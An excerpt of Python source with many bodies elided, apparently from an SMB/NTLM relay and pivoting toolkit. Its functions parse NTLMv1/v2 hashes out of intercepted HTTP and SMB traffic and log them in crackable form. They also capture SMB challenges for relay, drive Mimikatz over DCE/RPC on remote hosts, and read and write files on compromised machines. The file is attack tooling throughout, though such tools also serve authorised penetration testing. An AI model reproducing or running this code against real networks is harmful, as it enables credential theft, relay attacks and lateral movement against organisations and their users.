...
def ParseHTTPHash(data, key, client, UserToRelay, Host, Pivoting):
    ...
    LMHash       = codecs.encode(data[LMhashOffset:LMhashOffset+LMhashLen],'hex').decode('latin-1').upper()

    NthashLen    = struct.unpack('<H',data[20:22])[0]
    NthashOffset = struct.unpack('<H',data[24:26])[0]
    NTHash       = codecs.encode(data[NthashOffset:NthashOffset+NthashLen],'hex').decode('latin-1').upper()
    ...
    if NthashLen == 24:
        ...
        WriteHash       = '%s::%s:%s:%s:%s' % (User, HostName, LMHash, NTHash, codecs.encode(key, 'hex'))
    ...
    if NthashLen > 24:
        ...
        HostNameOffset = struct.unpack('<H',data[48:50])[0]
        HostName       = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
        WriteHash      = '%s::%s:%s:%s:%s' % (User, Domain, codecs.encode(key, 'hex'), NTHash[:32], NTHash[32:])
        WriteData(Logs_Path+"logs/SMB-Relay-"+client+".txt", WriteHash, User)
        if client == Host:
            if Pivoting[0] == "1":
                pass
...
def ParseSMBHash(data,client, challenge,UserToRelay,Host,Pivoting):  #Parse SMB NTLMSSP v1/v2
    ...
    LMHash       = codecs.encode(SSPIString[LMhashOffset:LMhashOffset+LMhashLen],'hex').decode('latin-1').upper()
...
def ExtractSMBChallenge(data, Pivoting):
    ...
    if Pivoting[0] == "1":
        ...
        print("[+] Setting up SMB relay with SMB challenge:", codecs.encode(Challenge,'hex').decode('latin-1'))
        return Challenge
...
def SMBKeepAlive(s, data):
    head = SMBHeader(cmd="\x2b",flag1="\x18", flag2="\x07\xc8",mid="\x04\x00",pid=data[30:32].decode('latin-1'),uid=data[32:34].decode('latin-1'),tid=data[28:30].decode('latin-1'))
    t = SMBEcho()
...
def ExtractRPCCommandOutput(data):
    DataLen = struct.unpack("<H", data[61:63])[0]
    if data[64:66] == b"\x05\x00":
        Output = data[88:88+DataLen].decode('latin-1')
    else:
        Output = data[64:64+DataLen].decode('latin-1')
    return Output
...
def MimiKatzRPC(Command, f, host, data, s):
    ...
    if data[8:10] == b"\x2f\x00":
        head = SMBHeader(cmd="\x2e",flag1="\x18", flag2="\x05\x28",mid="\x07\x00",pid=data[30:32].decode('latin-1'),uid=data[32:34].decode('latin-1'),tid=data[28:30].decode('latin-1'))
        t = SMBReadData(FID=f.decode('latin-1'),MaxCountLow=StructWithLenPython2or3('<h', 1024), MinCount=StructWithLenPython2or3('<h', 1024), Offset="\x00\x00\x00\x00")
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(NetworkSendBufferPython2or3(buffer1))
    ...
    if data[8:10] == b"\x2e\x05":
        ...
        while True:
            ...
            if data[64:66] == b"\x05\x00" and data[67] == b"\x03":##First and Last DCE/RPCFrag
                ...
                data, s, out = SMBDCERPCReadOutput(StructWithLenPython2or3("<i", dataoffset), StructWithLenPython2or3('<h', buffsize),f, data, s)
                Output += ExtractRPCCommandOutput(data)
...
def GrabAndRead(f, Filename, data, s):
    ...
    ##grab the filesize from the OpenAndX response.
        ...
        head = SMBHeader(cmd="\x2e",uid=data[32:34].decode('latin-1'),tid=data[28:30].decode('latin-1'),pid=data[30:32].decode('latin-1'),mid="\x12\x00")
        t = ReadRequestAndX(FID=f.decode('latin-1'))
        packet1 = str(head)+str(t)
        buffer1 = longueur(packet1)+packet1
        s.send(NetworkSendBufferPython2or3(buffer1))
        start_time = time.time()
        ...
        Output = ExtractCommandOutput(data).decode('latin-1')
        data = data.encode('latin-1')
        ##Do large reads..
        if data[8:10] == b"\x2e\x00" and struct.unpack("<H", data[61:63])[0] == 65520:
            print('File size: %s'%(GetReadableSize(filesize)))
            ...
            for i in range(count_number):
                ...
                data, s, out = ReadOutput(StructWithLenPython2or3("<i", dataoffset), f, data, s)
    ...
    if data[8:10] == b"\xa2\x00" and int(FileSize) >= 30000:
        ...
        for i in range(count_number):
            ...
            if len(Chunk) == 0:
                ...
                data, s = WriteOutput(StructWithLenPython2or3("<I",dataoffset), Chunk, data, f, s)
